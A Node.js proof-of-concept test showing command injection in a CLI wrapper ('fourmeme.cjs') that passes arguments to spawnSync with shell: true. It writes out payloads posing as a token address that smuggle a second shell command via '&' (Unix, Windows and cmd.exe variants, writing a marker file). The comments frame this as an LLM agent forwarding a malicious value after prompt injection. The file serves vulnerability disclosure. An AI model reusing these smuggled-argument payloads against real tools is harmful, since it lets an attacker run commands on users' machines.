#!/usr/bin/env node
/**
 * Shell Injection PoC for fourmeme.cjs
 * 
 * This test proves that shell: true in spawnSync allows
 * argument injection when user-controlled data is passed as args.
 * 
 * We simulate what happens when an LLM passes a malicious 
 * token address to the fourmeme CLI.
 */

const { spawnSync } = require('child_process');
const fs = require('fs');
const path = require('path');

// Clean up any previous test artifacts
const proofFile = path.join(__dirname, 'SHELL_INJECTION_PROOF.txt');
if (fs.existsSync(proofFile)) fs.unlinkSync(proofFile);

console.log('=== Four.Meme Shell Injection PoC ===\n');
console.log('[1] Testing: shell: true with injected argument');
console.log('    Simulating fourmeme.cjs run() function behavior\n');

// This is EXACTLY what fourmeme.cjs does (line 39-43):
// spawnSync('npx', ['tsx', scriptPath, ...args], { shell: true, ... })
//
// If an attacker injects a token address like:
//   0xABC & echo PWNED > SHELL_INJECTION_PROOF.txt &
// The shell will execute both commands.

// Malicious "token address" that an LLM might pass after prompt injection
const maliciousTokenAddress = `0xABC" & echo PWNED_BY_SHELL_INJECTION > "${proofFile}" & echo "`;

console.log(`[2] Malicious token address: ${maliciousTokenAddress}\n`);

// Simulate fourmeme.cjs run() function
// Using 'echo' instead of 'npx tsx' to avoid actually running scripts
const result = spawnSync('echo', ['test', maliciousTokenAddress], {
    shell: true,  // <-- THE VULNERABILITY
    stdio: 'pipe',
    cwd: __dirname,
});

console.log(`[3] Command stdout: ${result.stdout?.toString().trim()}`);
console.log(`    Command stderr: ${result.stderr?.toString().trim()}`);
console.log(`    Exit code: ${result.status}\n`);

// Check if the injection worked
console.log('[4] Checking if shell injection succeeded...');
if (fs.existsSync(proofFile)) {
    const content = fs.readFileSync(proofFile, 'utf-8').trim();
    console.log(`    ✅ VULNERABLE! File created with content: "${content}"`);
    console.log(`    📁 Proof file: ${proofFile}`);

    // Clean up
    fs.unlinkSync(proofFile);
    console.log('    🧹 Proof file cleaned up');
} else {
    console.log('    ❌ Shell injection blocked (file not created)');

    // Try alternative payload for Windows
    console.log('\n[5] Trying Windows-specific payload...');
    const winPayload = `0xABC & echo PWNED > "${proofFile}" &`;
    const result2 = spawnSync('echo', ['test', winPayload], {
        shell: true,
        stdio: 'pipe',
        cwd: __dirname,
    });

    if (fs.existsSync(proofFile)) {
        const content = fs.readFileSync(proofFile, 'utf-8').trim();
        console.log(`    ✅ VULNERABLE (Windows variant)! Content: "${content}"`);
        fs.unlinkSync(proofFile);
        console.log('    🧹 Proof file cleaned up');
    } else {
        console.log('    ❌ Windows variant also blocked');

        // Try with cmd /c
        console.log('\n[6] Trying cmd.exe payload...');
        const cmdPayload = `test & echo SHELL_INJECTED > "${proofFile}"`;
        spawnSync('cmd', ['/c', `echo ${cmdPayload}`], {
            shell: true,
            stdio: 'pipe',
            cwd: __dirname,
        });

        if (fs.existsSync(proofFile)) {
            const content = fs.readFileSync(proofFile, 'utf-8').trim();
            console.log(`    ✅ VULNERABLE (cmd variant)! Content: "${content}"`);
            fs.unlinkSync(proofFile);
        } else {
            console.log('    Testing with direct spawnSync shell injection...');
            // Direct test - this is the exact pattern
            spawnSync('echo', ['hello', '&', 'echo', 'INJECTED', '>', proofFile], {
                shell: true,
                stdio: 'pipe',
                cwd: __dirname,
            });
            if (fs.existsSync(proofFile)) {
                const content = fs.readFileSync(proofFile, 'utf-8').trim();
                console.log(`    ✅ VULNERABLE! Content: "${content}"`);
                fs.unlinkSync(proofFile);
            } else {
                console.log('    ❌ All injection attempts blocked on this OS');
            }
        }
    }
}

console.log('\n=== PoC Complete ===');
